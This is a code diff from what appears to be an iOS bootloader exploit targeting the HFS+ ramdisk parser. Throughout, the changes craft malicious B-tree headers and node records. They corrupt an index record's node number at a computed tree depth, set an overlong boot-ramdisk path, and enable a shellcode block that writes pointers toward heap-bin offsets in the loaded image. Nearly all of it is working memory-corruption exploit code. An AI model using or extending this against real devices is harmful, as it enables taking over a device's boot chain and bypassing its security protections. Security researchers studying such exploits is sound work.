@@ -74,7 +74,9 @@ real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
         dumpfile("DUMP_z1");
     }else{
-        //fprintf(stderr, "_memalign: sp = 0x%x\n", sp);
+#if 0
+        fprintf(stderr, "_memalign: sp = 0x%x\n", sp);
+#endif
     }
     (void)(r0 && r1 && r2);
 }
@@ -204,8 +206,8 @@ my_adjust_stack(void)
 void
 my_adjust_environ(void)
 {
-#if 0
-    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/disk.dmg", 0);
+#if 1
+    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/disk.dmg", 0);
 #endif
 }
 
@@ -267,12 +269,35 @@ suck_sid(void)
     dumpfile("DUMP2");
 }
 
+//
+int
+drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth)
+{
+    uint16_t i = 0;
+    while (1) {
+        unsigned int record_base = GET_WORD_LE(buffer, 0x200 - (i + 1) * 2);
+        if (record_base == 0) {
+            break;
+        }
+        uint16_t key_len = GET_WORD_LE(buffer, record_base);
+        uint16_t offset = record_base + 2 + key_len;
+        if (seq == 3 * (depth + 1) + 1 && i == floor((depth + 1) / 2.0)) {
+            //iPhone 4 rev.A (3,2) needs +4 as offset (why?)
+            eprintf("TRIGGERING: writed 0x100 (BE) at offset 0x%x\n", offset + 4);
+            PUT_DWORD_BE(buffer, offset + 4, 0x10000);
+            return 1;
+        }
+        i++;
+    }
+    return 0;
+}
+
 //todo
 int
 my_readp(void *ih, void *buffer, long long offset, int length)
 {
-#define TREEDEPTH 0 //no recursion, need to investigate this
-#define TRYFIRST 1 //recursion works
+#define TREEDEPTH 1 //+4? for recursion
+#define TRYFIRST 0
 #define TRYLAST 0
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
@@ -285,7 +310,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (0x400 * 4 * 4) //todo
+#define NODE_SIZE (0x400) //todo
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
@@ -324,7 +349,6 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 3);            /* BTHeaderRec::rootNode */
 #endif
                 memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
-                //starting from free_nodes
                 
                 break;
             case 2:
@@ -335,7 +359,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                 PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
-#if 0
+#if SHELLCODE
 #define START_OF_BTREE_HEADER 0x44594 //useless
 #define START_OF_EXTENTS_BTREE_HEADER START_OF_BTREE_HEADER + 0x100 //0x44694
 #define ALIGNED_POINTER_OFFSET START_OF_EXTENTS_BTREE_HEADER + 0x2C //todo
@@ -343,7 +367,6 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 
                 //bins (more or less) is at offset 0x447A0 (!!!)
                 //first bin is at 0x447A0 + 0x28 = 0x447C8
-                //diff is 0x134
                 
                 PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */ //this is a store
                 
@@ -401,131 +424,29 @@ my_readp(void *ih, void *buffer, long long offset, int length)
             {
                 static long long oldpos = 0;
                 if ((seq % 3) == 0) {
-                    ((unsigned char *)buffer)[9]++;                        /* BTNodeDescriptor::height */
+                    ((unsigned char *)buffer)[9] += 1;                        /* BTNodeDescriptor::height */
                     ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                     oldpos = offset;
                 } else if (oldpos) {
+                    
                     //this gets triggered always on the second call of the "loop"
                     //this actually trashes what is copied at line 284
                     lseek(rfd, oldpos, SEEK_SET);
-                    read(rfd, buffer, length);
+                    read(rfd, buffer, length); //if omitted, "ramdisk file invalid" is reported
                     oldpos = 0;
+                    
+                    //IMPORTANT: this is basically setting the node number field inside the corresponding index pointer record
+                    /*
+                     struct IndexPointerRecord {
+                        uint8/uint16 keyLength; //depending on the attributes field in the B-tree's header record. If the kBTBigKeysMask bit is set in attributes, the keyLength is a UInt16; otherwise, it's a UInt8.
+                        uint8_t key[keyLength];
+                        [pad]
+                        uin32_t nodeNumber; //<- we are targeting this. xerub refers this as "block number"
+                        [pad]
+                     }
+                     */
 #if 1
-                    if (seq == 1 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 32, 0x10000);
-                        eprintf("***TRIGGERING***\n");
-                        break;
-                    }
-#elif 0
-                    if (seq == 2 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 44, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 3 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 44, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 4 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 56, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 5 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 56, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 6 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 68, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 7 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 68, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 8 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 80, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 9 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 80, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 10 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 92, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 11 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 92, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 12 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 104, 0x10000);
-                        break;
-                    }
-#elif 1
-                    if (seq == 13 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 116, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 14 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 116, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 15 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 116, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 16 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 128, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 17 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 128, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 18 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 140, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 19 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 140, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 20 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 152, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 21 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 152, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 22 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 164, 0x10000);
-                        break;
-                    }
-#elif 0
-                    if (seq == 23 * 3 + 1) {
-                        PUT_DWORD_BE(buffer, 176, 0x10000);
-                        break;
-                    }
+                    drillDownPathTill(buffer, seq, 12);
 #endif
                 }
             }
